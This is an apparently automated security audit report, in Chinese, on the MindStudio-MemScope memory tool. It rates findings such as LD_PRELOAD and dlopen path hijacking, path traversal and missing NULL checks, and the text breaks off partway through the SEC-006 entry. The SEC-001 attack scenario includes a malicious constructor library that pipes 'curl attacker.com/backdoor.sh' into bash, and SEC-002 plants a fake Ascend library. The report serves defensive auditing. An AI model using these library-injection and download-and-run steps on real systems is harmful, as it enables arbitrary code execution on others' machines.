# 漏洞扫描报告 — 待确认漏洞

**项目**: MindStudio-MemScope
**扫描时间**: 2026-04-20T20:30:00Z
**报告范围**: 包含 LIKELY / POSSIBLE 状态的漏洞

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| LIKELY | 7 | 58.3% |
| POSSIBLE | 4 | 33.3% |
| CONFIRMED | 1 | 8.3% |
| **总计** | **12** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| High | 2 | 18.2% |
| Medium | 7 | 63.6% |
| Low | 2 | 18.2% |
| **有效漏洞总计** | **11** | - |
| 误报 (FALSE_POSITIVE) | 0 | - |

### 1.3 Top 10 关键漏洞

1. **[SEC-001]** Untrusted Search Path (High) - `csrc/framework/process.cpp:177` @ `Process::SetPreloadEnv` | 置信度: 75
2. **[SEC-002]** Untrusted Search Path (High) - `csrc/event_trace/vallina_symbol.cpp:33` @ `LibLoad` | 置信度: 75
3. **[SEC-010]** Out-of-bounds Write (Medium) - `csrc/event_trace/memory_watch/tensor_dumper.cpp:117` @ `TensorDumper::DumpOneTensor` | 置信度: 75
4. **[SEC-004]** Path Traversal (Medium) - `csrc/event_trace/memory_watch/tensor_dumper.cpp:30` @ `CleanFileName` | 置信度: 70
5. **[SEC-008]** Improper Input Validation (Medium) - `csrc/python_itf/msleaksmodule.cpp:152` @ `MsmemscopeTakeSnapshot` | 置信度: 70
6. **[SEC-009]** Improper Input Validation (Medium) - `csrc/python_itf/watcherobject.cpp:148` @ `PyMemScopeWatcherWatch` | 置信度: 65
7. **[SEC-011]** Untrusted Search Path (Medium) - `csrc/framework/process.cpp:187` @ `Process::SetPreloadEnv` | 置信度: 60
8. **[SEC-005]** Code Injection (Medium) - `python/msmemscope/hijacker/hijack_utility.py:46` @ `hijacker` | 置信度: 50
9. **[SEC-007]** Untrusted Pointer Dereference (Medium) - `csrc/event_trace/mstx_hooks/mstx_inject.cpp:69` @ `MstxTableCoreInject` | 置信度: 50
10. **[SEC-006]** Improper Control of Interaction via sys.meta_path (Low) - `python/msmemscope/hijacker/hijack_utility.py:346` @ `HiJackerManager.initialize` | 置信度: 50

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `main@csrc/main.cpp` | cmdline | untrusted_local | 命令行入口，接收用户传入的argc/argv参数，直接解析并执行用户命令 | CLI工具主入口，解析命令行参数并执行分析任务 |
| `PyInit__msmemscope@csrc/python_itf/msleaksmodule.cpp` | decorator | semi_trusted | Python模块初始化，暴露API供Python脚本调用，参数来自Python应用层 | Python C扩展模块入口，注册所有Python API |
| `MsmemscopeConfig@csrc/python_itf/msleaksmodule.cpp` | decorator | untrusted_local | Python config API，接收用户传入的kwargs字典，包含路径、配置参数等 | Python配置接口，设置追踪参数 |
| `MsmemscopeTakeSnapshot@csrc/python_itf/msleaksmodule.cpp` | decorator | untrusted_local | Python快照API，接收用户传入的memory_info字典，包含设备ID、路径等参数 | Python内存快照接口 |
| `PyMemScopeWatcherWatch@csrc/python_itf/watcherobject.cpp` | decorator | untrusted_local | Python watcher API，接收用户传入的tensor对象或addr+size参数 | Python tensor监控接口，添加监控目标 |
| `Process::DoLaunch@csrc/framework/process.cpp` | cmdline | untrusted_local | 使用execvpe执行用户指定的程序路径，程序路径来自命令行参数解析 | 执行目标程序，通过LD_PRELOAD注入钩子库 |
| `Process::SetPreloadEnv@csrc/framework/process.cpp` | env | semi_trusted | 读取环境变量LD_PRELOAD_PATH和ATB_HOME_PATH确定钩子库路径，环境变量可被外部设置 | 设置LD_PRELOAD环境变量注入钩子库 |
| `LibLoad@csrc/event_trace/vallina_symbol.cpp` | env | semi_trusted | 读取ASCEND_HOME_PATH环境变量拼接库路径并dlopen加载，环境变量可被外部控制 | 动态加载Ascend库函数 |
| `InitInjectionMstx@csrc/event_trace/mstx_hooks/mstx_inject.cpp` | rpc | semi_trusted | MSTX注入入口，通过函数指针表注入回调函数，被外部库调用 | MSTX API注入初始化 |
| `JsonManager::LoadFromFile@csrc/utility/json_manager.cpp` | file | untrusted_local | 读取用户指定的JSON配置文件，文件路径来自环境变量MSMEMSCOPE_CONFIG_ENV | 加载JSON配置文件 |
| `hijacker@python/msmemscope/hijacker/hijack_utility.py` | decorator | semi_trusted | Python模块/函数劫持注册，接收模块名、类名、方法名、stub回调函数等参数 | Python函数劫持注册接口 |
| `init_framework_hooks@python/msmemscope/__init__.py` | decorator | semi_trusted | Python框架钩子初始化接口，接收framework/version/component/hook_type参数 | 初始化框架级Python钩子 |
| `RegisterTraceCb@csrc/utility/cpython.cpp` | rpc | semi_trusted | 注册Python trace回调，通过PyEval_SetProfile设置Python解释器profile函数 | 注册Python trace回调函数 |

**其他攻击面**:
- 命令行参数解析 (--input, --output, --watch, --steps等参数路径注入)
- Python API参数 (config/watch/take_snapshot等API的参数)
- 环境变量 (LD_PRELOAD_PATH, ATB_HOME_PATH, ASCEND_HOME_PATH, MSMEMSCOPE_CONFIG_ENV)
- JSON配置文件 ({outputDir}/config.json)
- LD_PRELOAD钩子注入 (libleaks_ascend_hal_hook.so等动态库)
- MSTX API注入 (InitInjectionMstx函数指针表覆盖)
- Python模块劫持 (sys.meta_path注入自定义模块加载器)
- 共享内存IPC (钩子库与主进程的通信)

---

## 3. Top 5 漏洞深度分析

### [SEC-001] Untrusted Search Path - Process::SetPreloadEnv (Deep Analysis)

**严重性**: High | **CWE**: CWE-426 | **置信度**: 75/100 | **状态**: LIKELY

---

#### 漏洞触发路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 环境变量 LD_PRELOAD_PATH                                                     │
│     ↓                                                                       │
│ getenv("LD_PRELOAD_PATH") @ process.cpp:177                                 │
│     hookLibDir = preloadPath                                                │
│     ↓                                                                       │
│ for (hookLib : hookLibNames) @ process.cpp:205-214                          │
│     Path hookLibPath = Path(hookLibDir) / Path(hookLib)                     │
│     hookLibPath.Resolved()                                                  │
│     ↓                                                                       │
│ preloadEnv = Join(hookLibNames, ":")                                        │
│     ↓                                                                       │
│ setenv("LD_PRELOAD", preloadEnv.c_str(), 1)                                 │
│     ← 钩子库路径注入到 LD_PRELOAD                                             │
│     ↓                                                                       │
│ 目标进程启动时加载所有 LD_PRELOAD 库                                          │
│     ← 恶意库被执行                                                           │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 关键代码分析

```cpp
// process.cpp:177-214
void Process::SetPreloadEnv()
{
    string hookLibDir = "../lib64/";
    char const *preloadPath = getenv("LD_PRELOAD_PATH");  // ← 污点源
    if (preloadPath != nullptr && !string(preloadPath).empty()) {
        hookLibDir = preloadPath;  // ← 直接赋值，无验证
    }
    
    std::vector<string> hookLibNames{
        "libleaks_ascend_hal_hook.so",
        "libascend_mstx_hook.so",
        "libascend_kernel_hook.so"
    };
    
    // ... ATB_HOME_PATH 处理
    
    for (string &hookLib : hookLibNames) {
        Path hookLibPath = (Path(hookLibDir) / Path(hookLib)).Resolved();
        if (hookLibPath.ErrorOccured()) { return; }
        if (hookLibPath.Exists()) {
            hookLib = hookLibPath.ToString();  // ← 路径拼接
        }
    }
    
    string preloadEnv = Utility::Join(hookLibNames.cbegin(), hookLibNames.cend(), ":");
    setenv("LD_PRELOAD", preloadEnv.c_str(), 1);  // ← 污点汇
}
```

#### 攻击场景

**场景: 恶意钩子库注入**

```bash
# 1. 攻击者创建恶意钩子库
cat > /tmp/malicious_hook.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void malicious_init() {
    system("curl attacker.com/backdoor.sh | bash");
}
EOF
gcc -shared -fPIC /tmp/malicious_hook.c -o /tmp/libleaks_ascend_hal_hook.so

# 2. 设置环境变量指向恶意目录
export LD_PRELOAD_PATH=/tmp

# 3. 执行 MemScope 工具
msmemscope python /some/script.py

# 结果: 目标进程启动时加载恶意钩子库，攻击者获得控制权
```

#### 影响评估

- **可达性**: 20/30 — 环境变量通常由部署配置控制，非直接用户输入
- **可控性**: 25/25 — 攻击者可完全控制库路径
- **影响**: High — 任意代码执行（与 SEC-003 类似）

---

### [SEC-002] Untrusted Search Path - LibLoad (Deep Analysis)

**严重性**: High | **CWE**: CWE-426 | **置信度**: 75/100 | **状态**: LIKELY

---

#### 漏洞触发路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 环境变量 ASCEND_HOME_PATH                                                    │
│     ↓                                                                       │
│ getenv("ASCEND_HOME_PATH") @ vallina_symbol.cpp:33                          │
│     libPath = pathEnv                                                       │
│     libPath += "/lib64/" + libName                                          │
│     ↓                                                                       │
│ dlopen(libPath.c_str(), RTLD_NOW | RTLD_GLOBAL)                             │
│     ← 动态加载恶意库                                                          │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 关键代码分析

```cpp
// vallina_symbol.cpp:26-44
void *LibLoad(std::string libName)
{
    if (libName.empty()) {
        return nullptr;
    }
    std::string libPath = libName;
    const char *pathEnv = std::getenv("ASCEND_HOME_PATH");  // ← 污点源
    if (pathEnv && !std::string(pathEnv).empty()) {
        libPath = pathEnv;
        libPath += "/lib64/" + libName;  // ← 直接拼接
        return dlopen(libPath.c_str(), RTLD_NOW | RTLD_GLOBAL);  // ← 污点汇
    }
    // fallback: 直接 dlopen libName
    return dlopen(libPath.c_str(), RTLD_NOW | RTLD_GLOBAL);
}
```

#### 攻击场景

**场景: Ascend 库劫持**

```bash
# 1. 攻击者创建伪造的 Ascend 目录
mkdir -p /tmp/fake_ascend/lib64
cat > /tmp/fake_ascend/lib64/libascend_hal.c << 'EOF'
#include <stdio.h>
void malicious_func() {
    system("id > /tmp/pwned");
}
EOF
gcc -shared -fPIC /tmp/fake_ascend/lib64/libascend_hal.c \
    -o /tmp/fake_ascend/lib64/libascend_hal.so

# 2. 设置环境变量指向伪造目录
export ASCEND_HOME_PATH=/tmp/fake_ascend

# 3. 执行任何需要加载 Ascend 库的代码
python -c "import msmemscope; msmemscope.start()"

# 结果: 恶意库被加载
```

---

### [SEC-010] Out-of-bounds Write - TensorDumper::DumpOneTensor (Deep Analysis)

**严重性**: Medium | **CWE**: CWE-787 | **置信度**: 75/100 | **状态**: LIKELY

---

#### 漏洞触发路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ Python API watcher.watch(tensor 或 addr+length)                            │
│     ↓                                                                       │
│ PyMemScopeWatcherWatch @ watcherobject.cpp:148                              │
│     ParseInputArgs(args, tensorInfo, lengthObj, length)                     │
│     tensorInfo.dataSize = length                                            │
│     ↓                                                                       │
│ TensorMonitor::GetInstance().AddWatchTensor(tensorInfo)                     │
│     ↓                                                                       │
│ TensorDumper::Dump @ tensor_dumper.cpp:168                                  │
│     DumpOneTensor(tensorPair.second, fileName)                              │
│     ↓                                                                       │
│ std::vector<uint8_t> hostData(tensor.dataSize)                              │
│     ← 无上限验证，可能触发内存耗尽                                             │
│     ↓                                                                       │
│ aclrtMemcpy(hostData.data(), tensor.dataSize, ...)                          │
│     ← 复制可能失败但内存已分配                                                 │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 关键代码分析

```cpp
// tensor_dumper.cpp:117-133
bool TensorDumper::DumpOneTensor(const MonitoredTensor& tensor, std::string& fileName)
{
    if (!Utility::MakeDir(dumpDir_)) {
        return false;
    }
    
    // 无 dataSize 上限验证
    std::vector<uint8_t> hostData(tensor.dataSize);  // ← 可能分配超大内存
    
    aclError ret = vallina(hostData.data(), tensor.dataSize, 
                           tensor.data, tensor.dataSize, ACL_MEMCPY_DEVICE_TO_HOST);
    if (ret != ACL_SUCCESS) {
        return false;
    }
    // ...
}

// watcherobject.cpp:106-143 — tensorInfo.dataSize 来源
bool ParseInputArgs(PyObject *args, MonitoredTensor& tensorInfo, PyObject *lengthObj, uint64_t length)
{
    // ...
    if (!lengthObj) { // 传入的是 tensor
        ParseTensorPtrAndSize(tensorOrAddrObject, &ptr, length);
    } else { // 传入的是 addr + size
        length = static_cast<uint64_t>(PyLong_AsUnsignedLongLong(lengthObj));
    }
    tensorInfo.data = ptr;
    tensorInfo.dataSize = length;  // ← 用户控制的 size
    return true;
}
```

#### 攻击场景

**场景: 内存耗尽攻击**

```python
import msmemscope

msmemscope.start()

# 通过 Python API 设置超大的 dataSize
# watcher.watch(addr=0x1000, length=0xFFFFFFFFFFFFFFFF)  # 会导致内存耗尽
watcher.watch(addr=0x1000, length=1024*1024*1024*10)  # 10GB

# 触发 dump 操作时，程序尝试分配 10GB 内存
# 可能导致: OOM killer、程序崩溃、系统不稳定
```

#### 影响评估

- **类型**: DoS (内存耗尽)，非代码执行
- **可达性**: 30/30 — Python API 直接可达
- **可控性**: 15/25 — 用户可控制大小，但需触发 dump

---

### [SEC-004] Path Traversal - CleanFileName (Deep Analysis)

**严重性**: Medium | **CWE**: CWE-22 | **置信度**: 70/100 | **状态**: LIKELY

---

#### 漏洞触发路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ Python API watcher.watch(name="...")                                        │
│     ↓                                                                       │
│ PyMemScopeWatcherWatch @ watcherobject.cpp:161                              │
│     name = PyUnicode_AsUTF8(nameObj)                                        │
│     strlen(name) > MAX_WATCH_NAME_LENGTH 检查 (64字符)                       │
│     ↓                                                                       │
│ TensorDumper::GetInstance().SetDumpName(ptr, std::string(name))             │
│     ↓                                                                       │
│ TensorDumper::Dump @ tensor_dumper.cpp:187                                  │
│     watchedOpName = GetDumpName(ptr)                                        │
│     fileName = GetFileName(op, watchedOpName, ...)                          │
│     ↓                                                                       │
│ DumpTensorBinary @ tensor_dumper.cpp:58                                     │
│     CleanFileName(fileName)                                                 │
│     fileName = fileName.replace('/', '.')  # 仅替换 /                        │
│     ↓                                                                       │
│ outpath = binOutDir + '/' + fileName                                        │
│     ← ".." 序列未被处理，可能绕过目录限制                                       │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 关键代码分析

```cpp
// tensor_dumper.cpp:30-38
void CleanFileName(std::string& fileName)
{
    for (size_t i = 0; i < fileName.size(); i++) {
        if (fileName[i] == '/') {
            fileName[i] = '.';  // ← 仅替换 '/'，未处理 '..'
        }
    }
    // 缺失: 未移除 '..' 序列
}

// tensor_dumper.cpp:58-77
bool TensorDumper::DumpTensorBinary(const std::vector<uint8_t> &hostData, std::string& fileName)
{
    CleanFileName(fileName);
    
    std::string binOutDir = dumpDir_ + "/" + "device_" + std::to_string(devId) + "/" + WATCH_DUMP_DIR;
    std::string outpath = binOutDir + "/" + fileName;  // ← 直接拼接
    
    std::ofstream outFile(outpath, std::ios::binary);
    // ...
}
```

#### 攻击场景分析

**理论上可行的攻击**:

```python
# 尝试通过 name 参数注入路径遍历
watcher.watch(addr=0x1000, length=1024, name="..\\..\\..\\tmp\\evil")
```

**实际缓解因素**:
1. `MAX_WATCH_NAME_LENGTH = 64` 限制长度
2. `/` 被替换为 `.`，但 `\` 可能未被处理
3. `..` 序列未被移除，但路径长度限制部分缓解

**需要进一步验证的点**:
- Windows 环境下 `\` 是否被处理？
- 符号链接是否可绕过？

---

### [SEC-008] Improper Input Validation - MsmemscopeTakeSnapshot (Deep Analysis)

**严重性**: Medium | **CWE**: CWE-20 | **置信度**: 70/100 | **状态**: LIKELY

---

#### 漏洞触发路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ Python API msmemscope.take_snapshot(memory_info_dict)                       │
│     ↓                                                                       │
│ MsmemscopeTakeSnapshot @ msleaksmodule.cpp:135                              │
│     PyDict_Check(memory_info) ✓                                             │
│     ↓                                                                       │
│ PyDict_GetItemString(memory_info, "device")                                 │
│     ← 可能返回 NULL（键不存在）                                               │
│     ↓                                                                       │
│ PyLong_AsLong(NULL 或非整数对象)                                             │
│     ← NULL 情况: 返回 -1，设置 PyErr                                          │
│     ← 非整数: 返回 -1，设置 TypeError                                         │
│     ↓                                                                       │
│ snapshot_info.device = -1 或异常值                                           │
│     ← 可能导致后续逻辑错误                                                     │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### 关键代码分析

```cpp
// msleaksmodule.cpp:135-167
static PyObject* MsmemscopeTakeSnapshot(PyObject* self, PyObject* args)
{
    PyObject* memory_info = nullptr;
    if (!PyArg_ParseTuple(args, "O", &memory_info)) {
        return nullptr;
    }
    
    if (!PyDict_Check(memory_info)) {
        PyErr_SetString(PyExc_TypeError, "Invalid argument: expected a dictionary");
        return nullptr;
    }
    
    MemorySnapshotRecord snapshot_info;
    
    // 问题: PyDict_GetItemString 可能返回 NULL
    snapshot_info.device = PyLong_AsLong(
        PyDict_GetItemString(memory_info, "device"));  // ← 无 NULL 检查
    
    snapshot_info.memory_reserved = PyLong_AsUnsignedLongLong(
        PyDict_GetItemString(memory_info, "memory_reserved"));  // ← 无 NULL 检查
    
    // ...
}
```

#### 攻击场景

**场景: DoS (崩溃)**

```python
import msmemscope

# 缺少必要键
msmemscope.take_snapshot({})  # 可能崩溃

# 键类型错误
msmemscope.take_snapshot({"device": "not_an_int"})  # PyLong_AsLong 失败
```

#### 影响

- **类型**: DoS (程序崩溃)，非代码执行
- **严重性**: Medium — Python API 入口，可能导致工具停止工作
- **建议**: 添加 NULL 检查和类型验证

---

## 4. High 漏洞 (2)

### [SEC-001] Untrusted Search Path - Process::SetPreloadEnv

**严重性**: High（原评估: Critical → 验证后: High） | **CWE**: CWE-426 | **置信度**: 75/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `csrc/framework/process.cpp:177-214` @ `Process::SetPreloadEnv`
**模块**: framework

**描述**: LD_PRELOAD_PATH environment variable directly controls hook library loading path without validation. An attacker can set LD_PRELOAD_PATH to load malicious shared libraries via LD_PRELOAD injection, achieving arbitrary code execution with the privileges of the target process.

**漏洞代码** (`csrc/framework/process.cpp:177-214`)

```c
char const *preloadPath = getenv("LD_PRELOAD_PATH");
if (preloadPath != nullptr && !string(preloadPath).empty()) {
    hookLibDir = preloadPath;
}
...
setenv(envName.c_str(), preloadEnv.c_str(), 1);
```

**达成路径**

getenv(LD_PRELOAD_PATH) -> hookLibDir -> Path::Resolved() -> setenv(LD_PRELOAD)

**验证说明**: LD_PRELOAD_PATH环境变量直接控制hook库加载路径，无白名单验证。攻击者可设置恶意路径加载任意库。但环境变量通常由部署配置控制，非直接用户输入入口。信任边界为semi_trusted。

**评分明细**: base: 30 | reachability: 20 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [SEC-002] Untrusted Search Path - LibLoad

**严重性**: High（原评估: Critical → 验证后: High） | **CWE**: CWE-426 | **置信度**: 75/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `csrc/event_trace/vallina_symbol.cpp:33-43` @ `LibLoad`
**模块**: kernel_hooks

**描述**: ASCEND_HOME_PATH environment variable controls dynamic library loading path via dlopen. The path is constructed directly from environment variable without whitelist validation, allowing an attacker to inject malicious libraries by controlling ASCEND_HOME_PATH.

**漏洞代码** (`csrc/event_trace/vallina_symbol.cpp:33-43`)

```c
const char *pathEnv = std::getenv("ASCEND_HOME_PATH");
if (pathEnv && !std::string(pathEnv).empty()) {
    libPath = pathEnv;
    libPath += "/lib64/" + libName;
    return dlopen(libPath.c_str(), RTLD_NOW | RTLD_GLOBAL);
}
```

**达成路径**

getenv(ASCEND_HOME_PATH) -> libPath construction -> dlopen(libPath)

**验证说明**: ASCEND_HOME_PATH环境变量直接拼接dlopen路径，无白名单验证。攻击者控制环境变量可加载恶意库。信任边界为semi_trusted，环境变量通常由部署配置控制。

**评分明细**: base: 30 | reachability: 20 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

## 5. Medium 漏洞 (7)

### [SEC-010] Out-of-bounds Write - TensorDumper::DumpOneTensor

**严重性**: Medium | **CWE**: CWE-787 | **置信度**: 75/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `csrc/event_trace/memory_watch/tensor_dumper.cpp:117-133` @ `TensorDumper::DumpOneTensor`
**模块**: memory_watch
**跨模块**: python_itf → memory_watch

**描述**: In DumpOneTensor, tensor.dataSize (from user-controlled input via Python API) directly controls the size of std::vector allocation and aclrtMemcpy operation. No upper bound validation exists, potentially causing memory exhaustion or integer overflow if dataSize is set to an extremely large value.

**漏洞代码** (`csrc/event_trace/memory_watch/tensor_dumper.cpp:117-133`)

```c
std::vector<uint8_t> hostData(tensor.dataSize);
aclError ret = vallina(hostData.data(), tensor.dataSize, tensor.data, tensor.dataSize, ACL_MEMCPY_DEVICE_TO_HOST);
```

**达成路径**

watcher.watch(tensor or addr+length) -> ParseInputArgs -> tensorInfo.dataSize -> DumpOneTensor -> std::vector<uint8_t>(tensor.dataSize)

**验证说明**: tensor.dataSize无上限验证直接用于vector分配和aclrtMemcpy。攻击者可通过Python API传入极大值导致内存耗尽。这是DoS漏洞而非代码执行。跨模块调用链完整。

**评分明细**: base: 30 | reachability: 30 | controllability: 15 | mitigations: 0 | context: 0 | cross_file: 0

---

### [SEC-004] Path Traversal - CleanFileName

**严重性**: Medium（原评估: High → 验证后: Medium） | **CWE**: CWE-22 | **置信度**: 70/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `csrc/event_trace/memory_watch/tensor_dumper.cpp:30-38` @ `CleanFileName`
**模块**: memory_watch
**跨模块**: python_itf → memory_watch

**描述**: CleanFileName function only replaces '/' characters with '.' but does not handle '..' path traversal sequences. Combined with the fileName coming from user-provided watch name parameter, this could allow writing files outside the intended dump directory.

**漏洞代码** (`csrc/event_trace/memory_watch/tensor_dumper.cpp:30-38`)

```c
void CleanFileName(std::string& fileName)
{
    for (size_t i = 0; i < fileName.size(); i++) {
        if (fileName[i] == '/') {
            fileName[i] = '.';
        }
    }
}
```

**达成路径**

watcher.watch(name=...) -> SetDumpName(name) -> GetFileName(op, name) -> CleanFileName(fileName) -> outpath = binOutDir + '/' + fileName

**验证说明**: CleanFileName仅替换/为.，未处理..序列。Python API watch name参数传入后可能绕过路径限制。跨模块调用链完整。长度限制64字符部分缓解。

**评分明细**: base: 30 | reachability: 30 | controllability: 15 | mitigations: -5 | context: 0 | cross_file: 0

---

### [SEC-008] Improper Input Validation - MsmemscopeTakeSnapshot

**严重性**: Medium | **CWE**: CWE-20 | **置信度**: 70/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `csrc/python_itf/msleaksmodule.cpp:152-167` @ `MsmemscopeTakeSnapshot`
**模块**: python_itf

**描述**: MsmemscopeTakeSnapshot Python API function extracts values from dictionary using PyLong_AsLong/PyLong_AsUnsignedLongLong without checking if the values exist or are valid integers. Missing keys or wrong types could cause undefined behavior or crashes.

**漏洞代码** (`csrc/python_itf/msleaksmodule.cpp:152-167`)

```c
snapshot_info.device = PyLong_AsLong(PyDict_GetItemString(memory_info, "device"));
snapshot_info.memory_reserved = PyLong_AsUnsignedLongLong(PyDict_GetItemString(memory_info, "memory_reserved"));
...
strncpy_s(snapshot_info.name, sizeof(snapshot_info.name), name.c_str(), name.length());
```

**达成路径**

memory_info dict (Python) -> PyDict_GetItemString -> PyLong_AsLong/AsUnsignedLongLong -> snapshot_info struct

**验证说明**: PyDict_GetItemString可能返回NULL，直接调用PyLong_AsLong无NULL检查。缺少键或类型错误会导致崩溃或异常。这是可靠性问题(DoS)而非代码执行漏洞。Python API入口直接可达。

**评分明细**: base: 30 | reachability: 30 | controllability: 10 | mitigations: 0 | context: 0 | cross_file: 0

---

### [SEC-009] Improper Input Validation - PyMemScopeWatcherWatch

**严重性**: Medium | **CWE**: CWE-20 | **置信度**: 65/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `csrc/python_itf/watcherobject.cpp:148-192` @ `PyMemScopeWatcherWatch`
**模块**: python_itf
**跨模块**: python_itf → memory_watch

**描述**: PyMemScopeWatcherWatch Python API function extracts 'name' parameter and passes it to TensorDumper::SetDumpName. The name length is checked (max 64 chars) but no character validation prevents path traversal characters like '..' which could be exploited via CleanFileName bypass.

**漏洞代码** (`csrc/python_itf/watcherobject.cpp:148-192`)

```c
name = PyUnicode_AsUTF8(nameObj);
if (name == nullptr) {
    PyErr_SetString(PyExc_TypeError, "Parse name failed!");
    Py_RETURN_NONE;
}
if (std::strlen(name) > MAX_WATCH_NAME_LENGTH) {
    PyErr_Format(PyExc_ValueError, "Input name exceeds maximum allowed length %zu.", MAX_WATCH_NAME_LENGTH);
}
TensorDumper::GetInstance().SetDumpName(ptr, std::string(name));
```

**达成路径**

watcher.watch(name=...) -> PyUnicode_AsUTF8(name) -> strlen check -> SetDumpName -> DumpTensorBinary -> CleanFileName

**验证说明**: name参数长度检查存在(64字符)，但无字符类型验证。配合SEC-004 CleanFileName的..绕过可能实现路径遍历。跨模块调用链完整。Python API直接入口。

**评分明细**: base: 30 | reachability: 30 | controllability: 15 | mitigations: -10 | context: 0 | cross_file: 0

---

### [SEC-011] Untrusted Search Path - Process::SetPreloadEnv

**严重性**: Medium（原评估: Critical → 验证后: Medium） | **CWE**: CWE-426 | **置信度**: 60/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `csrc/framework/process.cpp:187-203` @ `Process::SetPreloadEnv`
**模块**: framework

**描述**: ATB_HOME_PATH environment variable controls which ATB hook library version (abi_0 or abi_1) is selected. Combined with LD_PRELOAD injection, an attacker controlling ATB_HOME_PATH could influence which hook library gets loaded, potentially bypassing security controls or loading incompatible/malicious libraries.

**漏洞代码** (`csrc/framework/process.cpp:187-203`)

```c
const char* atbHomePath = std::getenv("ATB_HOME_PATH");
if (atbHomePath == nullptr || string(atbHomePath).empty()) {
    LOG_WARN("The environment variable ATB_HOME_PATH is not set.");
} else {
    std::string pathStr(atbHomePath);
    if (pathStr.substr(pathStr.length() - abi0Str.length()) == abi0Str) {
        hookLibNames.push_back("libatb_abi_0_hook.so");
    } else if (...) {
        hookLibNames.push_back("libatb_abi_1_hook.so");
    }
}
```

**达成路径**

getenv(ATB_HOME_PATH) -> pathStr validation -> hookLibNames selection -> LD_PRELOAD construction

**验证说明**: ATB_HOME_PATH影响hook库版本选择(abi_0/abi_1)，但库名硬编码。攻击者只能选择版本而非加载任意库。实际影响有限，主要风险在于与SEC-001的联合利用。信任边界semi_trusted。

**评分明细**: base: 30 | reachability: 20 | controllability: 10 | mitigations: 0 | context: 0 | cross_file: 0

---

### [SEC-005] Code Injection - hijacker

**严重性**: Medium（原评估: Critical → 验证后: Medium） | **CWE**: CWE-94 | **置信度**: 50/100 | **状态**: POSSIBLE | **来源**: security-auditor

**位置**: `python/msmemscope/hijacker/hijack_utility.py:46-103` @ `hijacker`
**模块**: python_hijacker

**描述**: The hijacker() function accepts arbitrary callable 'stub' parameter that is stored and executed during function wrapping. An attacker who can control the stub parameter can inject arbitrary code that will be executed when the hijacked function is called.

**漏洞代码** (`python/msmemscope/hijacker/hijack_utility.py:46-103`)

```c
def hijacker(*, stub: callable, module: str, cls: str = "", function: str = "", action: int = REPLACE, priority: int = 100) -> str:
    HiJackerManager.initialize()
    unit = HijackerUnit(stub, module, cls, function, action, priority)
    ...
    handler.handler_id = HiJackerManager.add_unit(unit)
```

**达成路径**

stub callable -> HijackerUnit -> HiJackerManager.add_unit -> _get_wrapper() -> unit.stub(*args, **kws)

**验证说明**: hijacker函数接受任意callable stub参数，但stub来自Python代码而非用户输入数据。这是内部调试工具的设计功能而非安全漏洞。攻击者需能控制Python代码才能利用，可信场景下非真实漏洞。

**评分明细**: base: 30 | reachability: 20 | controllability: 0 | mitigations: 0 | context: 0 | cross_file: 0

---

### [SEC-007] Untrusted Pointer Dereference - MstxTableCoreInject

**严重性**: Medium（原评估: High → 验证后: Medium） | **CWE**: CWE-822 | **置信度**: 50/100 | **状态**: POSSIBLE | **来源**: security-auditor

**位置**: `csrc/event_trace/mstx_hooks/mstx_inject.cpp:69-94` @ `MstxTableCoreInject`
**模块**: mstx_hooks

**描述**: InitInjectionMstx accepts an external function pointer getFuncTable that is called to obtain a function pointer table (outTable). The code then writes internal function pointers into this table. If the external caller provides a malicious outTable, arbitrary memory writes could occur.

**漏洞代码** (`csrc/event_trace/mstx_hooks/mstx_inject.cpp:69-94`)

```c
bool MstxTableCoreInject(MstxGetModuleFuncTableFunc getFuncTable)
{
    ...
    *(outTable[static_cast<unsigned int>(mstxImplCoreFuncId::MSTX_API_CORE_MARK_A)]) = reinterpret_cast<MstxFuncPointer>(MstxMarkAFunc);
    *(outTable[static_cast<unsigned int>(mstxImplCoreFuncId::MSTX_API_CORE_RANGE_START_A)]) = reinterpret_cast<MstxFuncPointer>(MstxRangeStartAFunc);
    *(outTable[static_cast<unsigned int>(mstxImplCoreFuncId::MSTX_API_CORE_RANGE_END)]) = reinterpret_cast<MstxFuncPointer>(MstxRangeEndFunc);
}
```

**达成路径**

getFuncTable(external) -> getFuncTable(MSTX_API_MODULE_CORE, &outTable, &outSize) -> *(outTable[index]) = injected_function

**验证说明**: InitInjectionMstx接受外部getFuncTable函数指针，但调用者应为可信的MSTX/Ascend库组件而非攻击者。存在NULL检查和返回值验证。若调用者被攻击者控制则风险高，但常规部署中调用者可信。

**评分明细**: base: 30 | reachability: 20 | controllability: 0 | mitigations: 0 | context: 0 | cross_file: 0

---

## 6. Low 漏洞 (2)

### [SEC-006] Improper Control of Interaction via sys.meta_path - HiJackerManager.initialize

**严重性**: Low（原评估: High → 验证后: Low） | **CWE**: CWE-95 | **置信度**: 50/100 | **状态**: POSSIBLE | **来源**: security-auditor

**位置**: `python/msmemscope/hijacker/hijack_utility.py:346-350` @ `HiJackerManager.initialize`
**模块**: python_hijacker

**描述**: HiJackerPathFinder is inserted into sys.meta_path at position 0, allowing interception of all module imports. The _modules_of_interest set controls which modules are intercepted. If an attacker can manipulate this set or the HiJackerLoader behavior, they can inject malicious code during module loading.

**漏洞代码** (`python/msmemscope/hijacker/hijack_utility.py:346-350`)

```c
@classmethod
def initialize(cls):
    if cls._initialized:
        return
